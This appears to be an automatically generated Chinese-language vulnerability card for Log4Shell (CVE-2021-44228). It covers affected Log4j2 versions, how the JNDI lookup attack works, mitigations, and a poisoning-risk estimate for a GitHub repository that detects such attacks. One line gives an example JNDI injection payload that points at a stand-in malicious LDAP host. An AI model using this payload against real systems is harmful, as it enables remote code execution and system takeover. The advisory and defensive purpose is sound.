## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过控制日志消息或日志消息参数，从 LDAP 服务器加载并执行任意代码。漏洞利用方式是向服务器发送包含特定格式的 JNDI 注入payload的请求，例如 `${jndi:ldap://malicious-server.com/exploit}`。如果 Log4j2 记录了该请求，它会尝试解析该字符串，从而触发 JNDI 查找并从恶意服务器下载和执行代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞被广泛利用，POC代码有效。Unit 42、NVD、CrowdStrike、Sysdig、Oracle 等多个安全机构都发布了关于该漏洞的分析和缓解措施，证明了其真实性和危害性。

**投毒风险：**
提供的代码仓库主要侧重于使用机器学习方法检测Log4Shell攻击，而非直接的漏洞利用。尽管仓库中包含用于训练模型的日志数据和Python脚本，这些组件本身不太可能直接包含投毒代码。

风险在于：
1.  **数据污染：** 训练数据中可能包含精心构造的、旨在降低检测模型准确性的恶意日志条目（例如，通过添加混淆或规避技术），占比约5%。
2.  **依赖项风险：** `requirements.txt` 中列出的某些依赖项可能存在安全漏洞，但这不是作者的有意投毒。

总体而言，此代码仓库的投毒风险较低，约5%。

**利用方式：**
1.  攻击者将恶意 JNDI 注入 payload 插入到应用程序的日志消息中，例如通过 HTTP 请求头、POST 数据或其他用户可控的输入。
2.  如果应用程序使用存在漏洞的 Log4j2 版本记录此消息，Log4j2 会尝试解析 JNDI 字符串。
3.  Log4j2 触发 JNDI 查找，连接到攻击者控制的 LDAP 或 RMI 服务器。
4.  恶意服务器返回一个包含 Java 类的响应，该类包含攻击者想要执行的恶意代码。
5.  Log4j2 加载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.0 或更高版本。
*   禁用 JNDI 查找。
*   配置防火墙规则以阻止出站 LDAP 和 RMI 连接。

**项目地址:** [yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-](https://github.com/yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)